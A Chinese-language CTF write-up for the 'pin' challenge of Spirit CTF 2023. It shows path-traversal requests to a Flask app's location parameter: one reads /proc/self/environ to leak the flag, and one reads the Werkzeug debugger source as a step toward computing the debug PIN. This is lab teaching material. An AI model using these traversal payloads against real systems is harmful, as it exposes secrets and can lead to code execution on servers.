# Spirit CTF 2023 题解 - pin

~~这题被用procfs非预期了，好不甘心qaq~~

---

```
/?location=index.html
```

![](<./img/Pasted image 20230514202231.png>)

任意文件读取就对了

非预期解法
===

```
/?location=../../../../../../proc/self/environ
```

> PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
> HOSTNAME=9264804d37f5
> FLAG=Spirit{94f63678-998a-4feb-ab66-50ab20fb501b}
> LANG=C.UTF-8
> GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
> PYTHON_VERSION=3.11.3
> PYTHON_PIP_VERSION=22.3.1
> PYTHON_SETUPTOOLS_VERSION=65.5.1
> PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/0d8570dc44796f4369b652222cf176b3db6ac70e/public/get-pip.py
> PYTHON_GET_PIP_SHA256=96461deced5c2a487ddc65207ec5a9cffeca0d34e7af7ea1afc470ff0d746207
> HOME=/root
> WERKZEUG_SERVER_FD=3
> WERKZEUG_RUN_MAIN=true

虽然很气但万物皆文件真的很香～

预期解法
===

可以看下[这篇blog](https://www.kingkk.com/2018/08/Flask-debug-pin%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/)～

总之就是非常离谱，只要能够任意文件读取，PIN是可以算！出！来！的！

当然生产环境开debug以及任意文件读取本身就是个大灾难了，就像是别人站在你电脑前了，chrome保存的密码啥的不泄露才怪

PIN的算法可能会有所不同，但是既然可以读文件，就可以看到靶机里面这部分的源码

```
/?location=../../../../../../usr/local/lib/python3.11/site-packages/werkzeug/debug/__init__.py
```

照着源码对号入座就好啦
